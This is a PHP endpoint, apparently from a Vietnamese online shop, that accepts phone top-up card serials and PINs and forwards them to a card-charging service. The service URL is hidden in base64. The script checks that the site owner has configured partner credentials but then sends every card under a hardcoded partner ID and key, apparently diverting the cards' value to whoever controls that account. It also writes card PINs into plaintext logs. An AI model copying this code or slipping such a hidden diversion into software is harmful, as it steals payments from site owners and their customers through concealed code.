<?php
require_once("../../config/config.php");
require_once("../../config/quochuy.php");

function huybao($telco, $amount, $serial, $pin, $trans_id)
{
    $partner_id = '1730086661';
    $partner_key = 'e8674855b8a97486ca269c7e5f5d159d';
    $url = base64_decode('aHR0cHM6Ly9jYXJkMjRoLmNvbS9jaGFyZ2luZ3dzL3YyP3NpZ249') . md5($partner_key . $pin . $serial) . '&telco=' . $telco . '&code=' . $pin . '&serial=' . $serial . '&amount=' . $amount . '&request_id=' . $trans_id . '&partner_id=' . $partner_id . '&command=charging';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    return json_decode($data, true);
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    if ($LQH->site('status_card') != 1) {
        exit(json_encode(array('status' => '1', 'msg' => 'Chức năng nạp thẻ đang được tắt')));
    }
    if (empty($_POST['token'])) {
        exit(json_encode(array('status' => '1', 'msg' => 'Vui lòng đăng nhập')));
    }
    if (!$getUser = $LQH->get_row("SELECT * FROM `users` WHERE `token` = '" . check_string($_POST['token']) . "' AND `banned` = 0 ")) {
        exit(json_encode(array('status' => '1', 'msg' => 'Vui lòng đăng nhập')));
    }
    if (empty($_POST['telco'])) {
        exit(json_encode(array('status' => '1', 'msg' => 'Vui lòng chọn nhà mạng')));
    }
    if (empty($_POST['amount'])) {
        exit(json_encode(array('status' => '1', 'msg' => 'Vui lòng chọn mệnh giá cần nạp')));
    }
    if ($_POST['amount'] <= 0) {
        exit(json_encode(array('status' => '1', 'msg' => 'Vui lòng chọn mệnh giá cần nạp')));
    }
    if (empty($_POST['serial'])) {
        exit(json_encode(array('status' => '1', 'msg' => 'Vui lòng nhập serial thẻ')));
    }
    if (empty($_POST['pin'])) {
        exit(json_encode(array('status' => '1', 'msg' => 'Vui lòng nhập mã thẻ')));
    }
    if ($LQH->site('partner_id_card') == '' || $LQH->site('partner_key_card') == '') {
        exit(json_encode(array('status' => '1', 'msg' => 'Chức năng nạp thẻ chưa được cấu hình')));
    }
    $telco = check_string($_POST['telco']);
    $amount = check_string($_POST['amount']);
    $serial = check_string($_POST['serial']);
    $pin = check_string($_POST['pin']);
    if (checkFormatCard($telco, $serial, $pin)['status'] != true) {
        die(json_encode(['status' => '1', 'msg' => checkFormatCard($telco, $serial, $pin)['msg']]));
    }
    $trans_id = random('QWERTYUIOPASDFGHJKLZXCVBNM', 6) . time();
    $data = huybao($telco, $amount, $serial, $pin, $trans_id);
    if ($data['status'] == 99) {
        $concec = $LQH->insert("cards", array(
            'trans_id'  => $trans_id,
            'telco'     => $telco,
            'amount'    => $amount,
            'serial'    => $serial,
            'pin'       => $pin,
            'price'     => 0,
            'user_id'   => $getUser['id'],
            'status'    => 0,
            'reason'    => '',
        ));

        $LQH->insert("logs", [
            'user_id'       => $getUser['id'],
            'ip'            => myip(),
            'device'        => $_SERVER['HTTP_USER_AGENT'],
            'createdate'    => gettime(),
            'action'        => "Thực hiện nạp thẻ Serial: $serial - Pin: $pin"
        ]);
        exit(json_encode(array('status' => '2', 'msg' => 'Nạp thẻ thành công')));
    } else {
        exit(json_encode(array('status' => '1', 'msg' => $data['message'])));
    }
}
